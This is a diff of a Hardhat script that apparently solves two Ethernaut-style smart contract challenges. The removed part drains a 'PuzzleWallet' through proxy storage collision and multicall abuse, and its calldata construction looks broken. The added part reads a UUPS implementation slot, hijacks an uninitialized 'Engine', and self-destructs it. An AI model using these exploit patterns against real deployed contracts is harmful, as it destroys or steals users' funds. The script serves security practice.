@@ -9,47 +9,29 @@ const hre = require("hardhat");
 async function main() {
 
   const [player] = await hre.ethers.getSigners();
-  // Use the ABI form both the proxy contract and wallet contract pointed at the wallet address
-  const contractAddress = '0xbDf6D8D134505A81ab0a95eb7275a097E69f21E1';
-  const proxy = await hre.ethers.getContractAt("PuzzleProxy", contractAddress);
-  const wallet = await hre.ethers.getContractAt("PuzzleWallet", contractAddress);
+  // Get the motorbike instance
+  const contractAddress = '0xC304350FDC910f4E973065946cFF06aAAd0c4002';
+  const motorbike = await hre.ethers.getContractAt("Motorbike", contractAddress);
 
-  // Step 1: Become a pendingAdmin on the proxy contract which will by proxy make us the owner of the wallet contract
-  // const tx1 = await proxy.connect(player).proposeNewAdmin(player.address);
-  // const receipt1 = await tx1.wait()
-  // console.log(`Proxy Pending Admin: ${await proxy.connect(player).pendingAdmin()}`);
-  // console.log(`Wallet Owner: ${await wallet.connect(player).owner()}`);
+  // UUPS stores the address of the logic contract at _IMPLEMENTATION_SLOT
+  const _IMPLEMENTATION_SLOT = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc';
+  const engineAddressData = await hre.ethers.provider.getStorageAt(motorbike.address, _IMPLEMENTATION_SLOT);
+  const engineAddress = `${engineAddressData.slice(0,2)}${engineAddressData.slice(26)}`;
+  const engine = await hre.ethers.getContractAt("Engine", engineAddress);
 
-  // // Step 2: Add myself to the whitelist
-  // const tx2 = await wallet.connect(player).addToWhitelist(player.address);
-  // const receipt2 = await tx2.wait()
-  // console.log(`Player added to whitelist: ${await wallet.connect(player).whitelisted(player.address)}`); // will return true if completed successfully
+  // create the hacker contract by passing in engine contract address as a constructor argument
+  const HackEngineFactory = await hre.ethers.getContractFactory('HackEngine')
+  const HackEngine = await HackEngineFactory.deploy(engine.address);
 
-  // Step 3: Draining the wallet so that we can call the setMaxBalance variable to set ourselves as the admin 
-  // I had to look this up....
-  // We need to set up 3 separate function signatures:
-    // 1: We need to invoke the PuzzleWallet deposit function
-    // 2: We need to call the multicall function (which will call deposit again)
-    // 3: Call execute to ourselves --> Because we've effectively called deposit twice in the previous two functions, we'll actually get 2x our ETH
-  console.log(`Contract Balance Before Hack: ${await hre.ethers.provider.getBalance(wallet.address)}`);
-  const func1 = hre.ethers.utils.keccak256(
-    hre.ethers.utils.toUtf8Bytes('deposit()')
-  );
-  const func2 = hre.ethers.utils.keccak256(
-    hre.ethers.utils.toUtf8Bytes('multicall(bytes[])'),
-    hre.ethers.utils.toUtf8Bytes('deposit()')
-  );
-  const func3 = hre.ethers.utils.keccak256(
-    hre.ethers.utils.toUtf8Bytes('execute(address,uint256,bytes)'),
-    hre.ethers.utils.toUtf8Bytes(player.address),
-    hre.ethers.utils.toUtf8Bytes(hre.ethers.utils.parseEther("0.0001")),
-    hre.ethers.utils.toUtf8Bytes([])
-  );
-  const funcArray = [func1, func2, func3];
-  console.log(funcArray);
-  const tx3 = await wallet.connect(player).multicall(funcArray, { from: player.address, value: hre.ethers.utils.parseEther("0.00005") });
-  const receipt3 = await tx3.wait();
-  console.log(`Contract Balance After Hack: ${await hre.ethers.provider.getBalance(wallet.address)}`);
+  // call initialize to assume the upgrader role
+  const tx1 = await HackEngine.connect(player).attackEngine();
+  const receipt1 = await tx1.wait();
+  console.log(receipt1);
+
+  // destroy the contract by forcing it to self destruct by running the SelfDestructor initializer within it's own context
+  const tx2 = await HackEngine.connect(player).destroyWithSelfDesctructor();
+  const receipt2 = await tx2.wait();
+  console.log(receipt2);
 
 }
 
